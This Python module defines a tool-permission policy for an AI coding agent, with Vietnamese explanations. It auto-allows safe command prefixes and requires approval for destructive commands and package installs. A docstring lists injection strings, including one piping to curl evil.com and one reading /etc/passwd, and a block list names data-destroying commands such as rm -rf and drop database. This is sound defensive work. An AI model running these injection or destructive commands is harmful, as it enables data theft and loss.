from __future__ import annotations

import re
from collections.abc import Mapping
from dataclasses import dataclass
from enum import StrEnum

from .context import ExecutionContext
from .tools import ToolDefinition, ToolPermission

# Shell metacharacters that could be used for command injection.
# A "safe" command prefix must NOT be followed by any of these characters.
_SHELL_INJECTION_RE = re.compile(r'[;&|`$<>()\n\\]')


class ToolDecision(StrEnum):
    ALLOW = 'allow'
    REQUIRE_APPROVAL = 'require_approval'
    DENY = 'deny'


@dataclass(frozen=True, slots=True)
class ToolPolicyResult:
    decision: ToolDecision
    reason: str
    risk_explanation: str = ''


class ToolPolicy:
    SAFE_COMMAND_PREFIXES: tuple[str, ...] = (
        'pytest',
        'python -m pytest',
        'python3 -m pytest',
        'python -m unittest',
        'python3 -m unittest',
        'npm test',
        'npm run test',
        'npm run build',
        'npm run lint',
        'npm run typecheck',
        'npm run check',
        'yarn test',
        'yarn build',
        'yarn lint',
        'yarn typecheck',
        'pnpm test',
        'pnpm build',
        'pnpm lint',
        'pnpm typecheck',
        'cargo test',
        'cargo check',
        'cargo build',
        'cargo clippy',
        'go test',
        'go vet',
        'go build',
        'gofmt',
        'golangci-lint',
        'opa test',
        'helm lint',
        'docker ps',
        'docker logs',
        'docker info',
        'docker version',
        'git diff',
        'git status',
        'git log',
        'git branch',
        'git show',
        'git rev-parse',
        'ls',
        'dir',
        'cat',
        'echo',
        'grep',
        'find',
        'which',
        'where',
        'head',
        'tail',
        'python -m py_compile',
        'python3 -m py_compile',
        'ruff check',
        'mypy',
        'tsc --noEmit',
        'npx tsc',
        'npx eslint',
        'rg',
    )

    PACKAGE_INSTALL_PATTERNS: tuple[tuple[str, str], ...] = (
        ('npm install ', 'Cài đặt thêm thư viện/package mới qua npm.'),
        ('npm i ', 'Cài đặt thêm thư viện/package mới qua npm.'),
        ('yarn add ', 'Cài đặt thêm thư viện/package mới qua yarn.'),
        ('pnpm add ', 'Cài đặt thêm thư viện/package mới qua pnpm.'),
        ('pip install ', 'Cài đặt thêm thư viện/package mới qua pip.'),
        ('pip3 install ', 'Cài đặt thêm thư viện/package mới qua pip3.'),
        ('go get ', 'Thêm dependency/thư viện mới vào Go module.'),
        ('cargo add ', 'Cài đặt thêm crate mới vào Rust project.'),
    )

    DOCKER_FILE_PATTERNS: tuple[str, ...] = (
        'dockerfile',
        'docker-compose',
        'containerfile',
    )

    DESTRUCTIVE_COMMAND_PATTERNS: tuple[tuple[str, str], ...] = (
        ('rm -rf', 'Xóa đệ quy tệp hoặc thư mục mà không qua thùng rác, dữ liệu không thể phục hồi.'),
        ('rm -r', 'Xóa thư mục đệ quy có thể làm mất nhiều tệp dữ liệu quan trọng.'),
        ('git reset --hard', 'Hủy bỏ toàn bộ các thay đổi chưa commit trong workspace hiện tại.'),
        ('git push --force', 'Ghi đè lịch sử commit trên remote repository, có thể làm mất mã nguồn của người khác.'),
        ('git push -f', 'Ghi đè lịch sử commit trên remote repository, có thể làm mất mã nguồn của người khác.'),
        ('git clean -fd', 'Xóa vĩnh viễn toàn bộ các tệp untracked trong repository.'),
        ('git checkout -- .', 'Hủy bỏ toàn bộ các sửa đổi trong thư mục làm việc hiện tại.'),
        ('drop table', 'Xóa cấu trúc bảng và toàn bộ dữ liệu trong bảng vĩnh viễn.'),
        ('drop database', 'Xóa toàn bộ cơ sở dữ liệu vĩnh viễn.'),
        ('truncate table', 'Xóa sạch dữ liệu trong bảng.'),
    )

    @staticmethod
    def _is_safe_command(cmd: str) -> bool:
        """Return True only if the command starts with a known-safe prefix AND
        contains no shell injection metacharacters anywhere in the string.

        This prevents bypass attacks such as:
            "pytest; rm -rf /"          → rejected (semicolon)
            "pytest | curl evil.com"    → rejected (pipe)
            "grep $(cat /etc/passwd)"   → rejected (subshell)
        """
        if _SHELL_INJECTION_RE.search(cmd):
            return False
        for safe_pfx in ToolPolicy.SAFE_COMMAND_PREFIXES:
            if cmd.startswith(safe_pfx):
                # Ensure the character immediately following the prefix (if any)
                # is a space or end-of-string, not another word character.
                remainder = cmd[len(safe_pfx):]
                if not remainder or remainder[0] in (' ', '\t', '-', '/', '.'):
                    return True
        return False

    def evaluate(
        self,
        tool: ToolDefinition,
        context: ExecutionContext,
        arguments: Mapping[str, object] | None = None,
    ) -> ToolPolicyResult:
        args = arguments or {}

        # 0. READ-only tools are always allowed — never interrupt the user for reads.
        if (
            ToolPermission.READ in tool.permissions
            and ToolPermission.WRITE not in tool.permissions
            and ToolPermission.EXECUTE not in tool.permissions
            and ToolPermission.DESTRUCTIVE not in tool.permissions
            and ToolPermission.NETWORK not in tool.permissions
        ):
            return ToolPolicyResult(
                ToolDecision.ALLOW,
                reason='read-only tool is always permitted without interruption',
            )

        # 1. Evaluate destructive and high-risk command patterns in run_command.
        #    Supports both argv list (from workspace_tools) and command string (legacy/tests).
        if tool.name == 'run_command':
            argv_value = args.get('argv')
            if isinstance(argv_value, list):
                cmd = ' '.join(str(x) for x in argv_value).strip().lower()
            else:
                cmd = str(args.get('command', '')).strip().lower()
            for pattern, explanation in self.DESTRUCTIVE_COMMAND_PATTERNS:
                if pattern in cmd:
                    return ToolPolicyResult(
                        ToolDecision.REQUIRE_APPROVAL,
                        reason=f'Lệnh nguy hiểm: {pattern}',
                        risk_explanation=explanation,
                    )
            for pattern, explanation in self.PACKAGE_INSTALL_PATTERNS:
                if pattern in cmd:
                    return ToolPolicyResult(
                        ToolDecision.REQUIRE_APPROVAL,
                        reason=f'Cài đặt thư viện mới: {pattern.strip()}',
                        risk_explanation=explanation,
                    )
            if self._is_safe_command(cmd):
                return ToolPolicyResult(
                    ToolDecision.ALLOW,
                    reason='Lệnh kiểm thử hoặc tra cứu an toàn được phép tự động chạy',
                )

        # 2. Evaluate Dockerfile & container configuration file modifications
        path_arg = str(
            args.get('path')
            or args.get('target_file')
            or args.get('file_path')
            or args.get('file')
            or ''
        ).strip().lower()
        if path_arg:
            for docker_pattern in self.DOCKER_FILE_PATTERNS:
                if docker_pattern in path_arg:
                    return ToolPolicyResult(
                        ToolDecision.REQUIRE_APPROVAL,
                        reason=f'Sửa đổi tệp cấu hình Docker/Container: {path_arg}',
                        risk_explanation='Sửa đổi hoặc xóa file cấu hình Docker (Dockerfile, docker-compose.yml) có ảnh hưởng lớn đến môi trường hạ tầng container, cần có sự phê duyệt trước khi thực thi.',
                    )

        # 3. Evaluate mass modifications (thay đổi quá nhiều vị trí)
        if tool.name == 'multi_replace_file_content':
            chunks = args.get('replacement_chunks') or args.get('chunks') or []
            if isinstance(chunks, (list, tuple)) and len(chunks) > 10:
                return ToolPolicyResult(
                    ToolDecision.REQUIRE_APPROVAL,
                    reason=f'Thay đổi quá nhiều khối mã nguồn cùng lúc ({len(chunks)} khối)',
                    risk_explanation=f'Yêu cầu sửa đổi đồng thời {len(chunks)} khối mã nguồn trong cùng một tệp. Thao tác có quy mô lớn cần được người dùng kiểm tra và phê duyệt.',
                )

        # 4. Evaluate delete_path tool
        if tool.name == 'delete_path':
            path = str(args.get('path', '')).strip()
            is_recursive = bool(args.get('recursive', False))
            if is_recursive:
                return ToolPolicyResult(
                    ToolDecision.REQUIRE_APPROVAL,
                    reason='Xóa thư mục hoặc tệp đệ quy',
                    risk_explanation=f"Tôi cần xóa đường dẫn '{path}' (bao gồm toàn bộ thư mục và tệp con bên trong). Thao tác này sẽ xóa vĩnh viễn dữ liệu và không thể hoàn tác.",
                )

        # 3. Explicit destructive permission
        if ToolPermission.DESTRUCTIVE in tool.permissions:
            return ToolPolicyResult(
                ToolDecision.REQUIRE_APPROVAL,
                reason='destructive tool requires explicit approval',
                risk_explanation='Thao tác có tính chất phá hủy hoặc thay đổi lớn cần được bạn phê duyệt trước khi thực thi.',
            )

        # 4. Write permission checks
        if ToolPermission.WRITE in tool.permissions and context.user_id is None:
            return ToolPolicyResult(
                ToolDecision.DENY,
                reason='write tool requires an authenticated user scope',
            )

        # 5. Execute permission checks
        if ToolPermission.EXECUTE in tool.permissions and context.workspace_id.strip() == '':
            return ToolPolicyResult(
                ToolDecision.DENY,
                reason='execute tool requires a workspace scope',
            )

        # 6. Network permission checks — require authenticated user to prevent
        #    unauthenticated outbound requests that could exfiltrate data.
        if ToolPermission.NETWORK in tool.permissions and context.user_id is None:
            return ToolPolicyResult(
                ToolDecision.DENY,
                reason='network tool requires an authenticated user scope to prevent unauthorized outbound access',
            )

        return ToolPolicyResult(ToolDecision.ALLOW, reason='policy allows execution')
